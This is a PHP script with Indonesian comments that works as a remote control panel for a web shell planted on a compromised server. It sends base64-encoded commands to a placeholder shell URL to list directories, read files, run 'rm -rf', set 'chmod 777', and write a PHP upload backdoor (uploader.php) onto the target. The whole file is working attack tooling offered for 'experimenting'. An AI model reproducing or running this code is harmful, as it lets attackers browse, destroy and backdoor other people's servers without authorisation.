<?php
/*
11 sep 2020
Masih ada bug,silahkan buat bahan percobaan
*/
$file_shell = 'http://link_shell.com/remote_shell.php'; //masukin link remote shell

function lokasi(){
    $base = rawurldecode($_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"]);
    $base = str_replace(' ','%20',$base);
    $pecah = explode('/' , $base);
    $hitung = substr_count( $base, "/" );
    $folder = str_replace($pecah[$hitung], '', $base);
    $lokasi = 'http://'.$folder;
    return $lokasi; //bisa $lokasi / $base
}
function redirect($target){
  header("Location: $target");
}
function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function curl($target,$comand){
  $post= "cmd=$comand";
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $target);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  $response = curl_exec($ch);
  curl_close($ch);
  return $response;
}
function cmd_64($comand){
    $a = base64_encode($comand);
    $a = str_replace('=','',$a);
    return $a;
}
function dir_($dir){
    return "$dir";
}
function spawn_uploader($file_shell){
    $cmd1 = 'touch uploader.php && echo "<form action='."''".' method='."'post'".' enctype='."'multipart/form-data'".' name='."'uploader'>".'" > ./uploader.php';
    $comand_64 = cmd_64($cmd1);
    $response = curl($file_shell,$comand_64);

    $cmd2 = 'echo "<input type='."'file'".' name='."'file'".'>" >> ./uploader.php';
    $comand_64 = cmd_64($cmd2);
    $response = curl($file_shell,$comand_64);

    $cmd3 = 'echo " <input name='."'_upl'".' type='."'submit'".' value='."'Upload' > ".' " >> ./uploader.php';
    $comand_64 = cmd_64($cmd3);
    $response = curl($file_shell,$comand_64);

    $cmd4 = 'echo "</form>" >> ./uploader.php';
    $comand_64 = cmd_64($cmd4);
    $response = curl($file_shell,$comand_64);

    $cmd5 = "echo '<?php if(".'@$_POST["_upl"]== "Upload") {if(@copy($_FILES["file"]["tmp_name"] , $_FILES["file"] ["name"] )) {echo "upload";}} ?> '." ' >> ./uploader.php";
    $comand_64 = cmd_64($cmd5);
    $response = curl($file_shell,$comand_64);

    $c = 'touch uploader.php && uploader script';
    return $c;
}
function hapus($comand,$dir){
    //cek target file atau folder
    $pecah_dir = explode('/',$dir);
    $hitung_pecah_dir = count($pecah_dir);
    $file_folder = end($pecah_dir);
    //comand
    $pecah_cmd = explode('&&',$comand);
    $hitung_pecah_cmd = count($pecah_cmd);
    $cc = ($hitung_pecah_cmd-1);
    $cmd_last = $pecah_cmd[$cc];
    //folder
    if($file_folder == NULL){
        //hapus last cmd
        $a = str_replace($cmd_last,'',$comand);
        //
        $p = ($hitung_pecah_dir-2); // folder
        $folder = $pecah_dir[$p]; // folder
        $c = "$comand rm -rf $folder";
        $pc = explode('&&',$c);
        $hpc = count($pc);

        //
        for ($i=0; $i < $hpc ; $i++) {
            //potong comand terakhir
            //echo "$i-$pc[$i]<hr>";
            if($i != $hpc-2){
              if($i < $hpc-1){
                $co[] = $pc[$i].'&&';
              }else{
                $co[] = $pc[$i];
              }
            }
        }
        //echo "-----comand: $c<hr>";
        //echo "-----t: $hpc<hr>";
        //echo "-----new: $comand<hr>";
      $c = implode($co);
    }else{
      $c = "$comand rm $file_folder";
    }
    //echo "---$c";
    return $c;
}
function back($dir){
    $lokasis = explode('/',$dir);
    $hitung = count($lokasis);

    if($lokasis[$hitung-1] == NULL){
        $a = $hitung-2;
    }else{
        $a = $hitung-1;
    }
    $hapus = $lokasis[$a];
    $lokasi_baru = str_replace($hapus,'',$dir);
    $c = strlen($lokasi_baru);
    @$aa = $lokasi_baru[$c];
    $a1 = ($c-1);
    $a2 = ($c-2);
    if($lokasi_baru[$a1] == '/' && $lokasi_baru[$a2] == '/'){
        $lokasi_baru = substr($lokasi_baru,0,$a1);
    }else{
        $lokasi_baru = $lokasi_baru;
    }
    return $lokasi_baru;
}
//cek folder sekarang
function cek_dir($file_shell,$dir_sekarang){
    $clean_dir = preg_quote($dir_sekarang, '/');

    //file shell
    $fs = explode('/',$file_shell);
    $hfs = count($fs);
    $hfs1 = ($hfs-1); //
    $hfs2 = ($hfs-2); // total sampai ke public_html
    //echo "FILE SHELL: $hfs2<hr>";

    //dir_sekarang
    $ds = explode('/',$dir_sekarang);
    $hds = count($ds);
    $hds1 = ($hds-1); //
    $hds2 = ($hds-2); // total sampai ke public_html
    //echo "DIR SEKARANG: $hds2<hr>";

    //
    //jika semua sama
    if($file_shell == $dir_sekarang){
        //lagi buka shell
        echo "Versi 1<hr>";
        echo "comand nya cat nama script<hr>";
        //$comand[] = 'ls';
    }else if(preg_match("/$clean_dir/",$file_shell)){
        //jika belum ada perubahan
        echo "Versi 2<hr>";
        //echo "belum ada perubahan<hr>";
        //cek total mundur
        $cek_mundur = ($hfs2-$hds2);
        echo "MUNDUR: $cek_mundur<hr>";
        //cek comand
        if($cek_mundur == '0'){
            $comand[] = "";
        }else{
            for ($i=0; $i < $cek_mundur ; $i++) {
                if($i < $cek_mundur-1){
                  $comand[] = "cd .. && ";
                }else{
                  $comand[] = "cd .. && ";
                }
            }
        }
        $comand_mundur = implode($comand);
        echo "COMAND: $comand_mundur<hr>";
    }else{
        //jika ada perubahan
        echo "Versi 3<hr>";
        //echo "ada perubahan<hr>";
        //cek bedanya sampai mana
        //echo "BEDA: $file_shell > $dir_sekarang <hr>";
        //pecah buat cari beda
        for ($i=0; $i < $hds  ; $i++) {
            //cari perbedaan
            if($fs[$i] != $ds[$i] && $ds[$i] != NULL){
              $beda[] = $ds[$i];
              $beda_kes[] = $i;
            }
            $ambil_yang_beda[] = $ds[$i];
        }
        $beda_ke = $beda_kes[0];
        //echo "BEDANYA DI: $beda[0] ke $beda_kes[0]<hr>";
        //cari yang sama pakai array
        for ($i=0; $i < $beda_ke; $i++) {
              $sama[] = "$fs[$i]/";
        }
        $hitung_sama = count($sama);
        $sama = implode($sama);
        //echo "---SAMA: $sama<hr>";

        //cek maju
        //pecah yg sama ke dir sekarang
        //pecah lagi /
        $ambiL_beda = explode($sama,$dir_sekarang);
        //echo $ambiL_beda[1]; // ini yg beda
        //
        $pecah_ambiL_sama = explode('/',$sama);
        $pecah_ambiL_beda = explode('/',$ambiL_beda[1]);
        //echo $pecah_ambiL_sama[2].'<br>';
        //
        $cek_maju = count($pecah_ambiL_beda);
        $cek_maju = ($cek_maju-1);
        //$cek_maju = ();
        //echo "---MAJU: $cek_maju | $hds1 - $hitung_sama<hr>";

        //cek mundur
        //link shell dipecah pake sama,yang beda
        //dipecah lagi terus dihitung
        $ambiL_beda_shell = explode($sama,$file_shell);
        $mundur_c = $ambiL_beda_shell[1];
        $c = explode('/',$mundur_c);



        //cek mundur .. - .. = 2
        $cek_mundur = count($c);
        $cek_mundur = ($cek_mundur);
        //$cek_mundur = ($hds1-$hitung_sama);
        //echo "---MUNDUR: $cek_mundur | $hfs - $hitung_sama<hr>";

        //comand mundur
        if($cek_mundur == '0'){
            $comand_mundur[] = "ls";
        }else{
            for ($i=0; $i < $cek_mundur-1 ; $i++) {
                if($i < $cek_mundur-1){
                  $comand_mundur[] = "cd .. && ";
                }else{
                  $comand_mundur[] = "cd .. ";
                }
            }
        }
        $comand_mundur = implode($comand_mundur);
        echo "COMAND MUNDUR: $comand_mundur<hr>";

        //comand maju
        if($cek_maju == '0'){
            $comand_maju[] = "ls";
        }else{
            for ($i=0; $i < $cek_maju ; $i++) {
              if($pecah_ambiL_beda[$i] != NULL){
                if($i < $cek_maju-1){
                  $comand_maju[] = "cd $pecah_ambiL_beda[$i] && ";
                }else{
                  $comand_maju[] = "cd $pecah_ambiL_beda[$i] && ";
                }
              }
            }
        }
        $comand_maju = implode($comand_maju);
        echo "COMAND MAJU: $comand_maju<hr>";


    }
    $comand_lengkap = @$comand_mundur.@$comand_maju;
    return $comand_lengkap;
}
function cat($file_shell,$dir_sekarang,$file){
    $cat = "$dir_sekarang cat $file"; //$file_shell?cmd=$cmd
    $comand = cmd_64($cat);
    //echo "$cat<br>";
    echo "zCOMAND: $comand<hr>";
    $curl = curl($file_shell,$cat);
    echo "$curl";
    $filter_text_area = str_replace('textarea','#textarea',$curl);
    $response = "<textarea>$filter_text_area</textarea>";
    return $response;
}
function permision($comand,$dir){
    //cek target file atau folder
    $pecah_dir = explode('/',$dir);
    $hitung_pecah_dir = count($pecah_dir);
    $file_folder = end($pecah_dir);
    //comand
    $pecah_cmd = explode('&&',$comand);
    $hitung_pecah_cmd = count($pecah_cmd);
    $cc = ($hitung_pecah_cmd-1);
    $cmd_last = $pecah_cmd[$cc];
    //folder
    if($file_folder == NULL){
        //hapus last cmd
        $a = str_replace($cmd_last,'',$comand);
        //
        $p = ($hitung_pecah_dir-2); // folder
        $folder = $pecah_dir[$p]; // folder
        $c = "$comand chmod 777 $folder";
        $pc = explode('&&',$c);
        $hpc = count($pc);

        //
        for ($i=0; $i < $hpc ; $i++) {
            //potong comand terakhir
            //echo "$i-$pc[$i]<hr>";
            if($i != $hpc-2){
              if($i < $hpc-1){
                $co[] = $pc[$i].'&&';
              }else{
                $co[] = $pc[$i];
              }
            }
        }
        //echo "-----comand: $c<hr>";
        //echo "-----t: $hpc<hr>";
        //echo "-----new: $comand<hr>";
      $c = implode($co);
    }else{
      $c = "$comand chmod 777 $file_folder";
    }
    //echo "---$c<hr>";
    return $c;
}
////////////////////////////
//$a = curl($file_shell,'bHM'); //ls
//$a = curl($file_shell,'Y2QgLi4gJiYgbHM='); // cd .. && ls
//$a = curl($file_shell,'Y2QgLi4gJiYgY2QgLi4gJiYgbHM'); // cd .. && cd .. && ls
////////////////////////////
$file = lokasi();
if(!isset($_GET['dir'])){
    header("Location: $file?dir=$file_shell");
    echo "$file_ini?cmd=$file_shell";
}else{
    $dir = $_GET['dir'];
}

//back
$back = back($dir);
//echo spawn_uploader().'<hr>';
echo '<a href="?dir='.$dir.'&comand=uploader">SPAWN UPLOADER</a><hr>';
echo '<a href="?dir='.$back.'">Kembali</a><hr>';
/////comand
$comand = cek_dir($file_shell,$dir);

//jika file atau folder
$clean_dir = preg_quote($dir, '/');
if(isset($_GET['comand'])){
    if($_GET['comand'] == 'hapus'){
        //hapus -> dir
        $hapus = hapus($comand,$dir);
        echo "$hapus";
        $comand = $hapus;
    }else if($_GET['comand'] == 'permison'){
        //permison
        $permision = permision($comand,$dir);
        echo "$permision";
        $comand = $permision;
    }else if($_GET['comand'] == 'uploader'){
        //uploader
        $uploader = spawn_uploader($file_shell);
        echo "$uploader<br>";
        //$comand = $uploader;
    }


    $comand_64 = cmd_64($comand);
    $dir = dir_($dir);
    /////note
    echo "<hr>COMAND LS: $comand<hr>";
    echo "COMAND 64: $comand_64<hr>";
    echo "LINK SHELL: $file_shell<hr>";
    echo "DIR SEKARANG: $dir<hr><hr>";

    /////script
    $response = curl($file_shell,$comand_64); // cd .. && cd .. && ls
    echo "$response<hr>";

}else if(!preg_match('/(.php|.html|.json|.txt)/',$clean_dir)){
  //folder
  $comand = "$comand ls";
  $comand_64 = cmd_64($comand);
  $dir = dir_($dir);


  /////note
  echo "<hr>COMAND LS: $comand<hr>";
  echo "COMAND 64: $comand_64<hr>";
  echo "LINK SHELL: $file_shell<hr>";
  echo "DIR SEKARANG: $dir<hr><hr>";

  /////script
  $response = curl($file_shell,$comand_64); // cd .. && cd .. && ls
  //echo "$response<hr>";

  //files
  $pecah = explode("\n",$response);
  $hitung_pecah = count($pecah);

  for ($i=0; $i < $hitung_pecah ; $i++) {
    // code...
    if($pecah[$i] != NULL){
      if(!preg_match("/.php/",$pecah[$i])){
        echo '<a href="?dir='.$dir.$pecah[$i].'/">'.$pecah[$i].'</a> | <a href="?dir='.$dir.$pecah[$i].'/&comand=hapus">HAPUS</a> | <a href="?dir='.$dir.$pecah[$i].'/&comand=permison">CMOD</a><br>';
      }else{
        echo '<a href="?dir='.$dir.$pecah[$i].'">'.$pecah[$i].'</a> | <a href="?dir='.$dir.$pecah[$i].'&comand=hapus">HAPUS</a> | <a href="?dir='.$dir.$pecah[$i].'/&comand=permison">CMOD</a><br>';
      }
    }
  }
}else{
  //file
  $files = explode('/',$dir);
  $file = end($files);
  $comand = "$comand cat $file"; //$file_shell?cmd=$cmd

  $comand_64 = cmd_64($comand);
  $dir = dir_($dir);

  /////note
  echo "<hr>COMAND LS: $comand<hr>";
  echo "COMAND 64: $comand_64<hr>";
  echo "LINK SHELL: $file_shell<hr>";
  echo "DIR SEKARANG: $dir<hr><hr>";

  /////script
  $response = curl($file_shell,$comand_64); // cd .. && cd .. && ls
  //echo "$response<hr>";

  $filter_text_area = str_replace('textarea','#textarea',$response);
  $response = "<textarea>$filter_text_area</textarea>";
  echo $response;
}
?>
<style>
* {

  color: #00ff00;
  background-color: black;
  background-repeat: no-repeat;
}
textarea{
  border: solid 1px red;
  width: 100%;
  height: 200px;
}

</style>
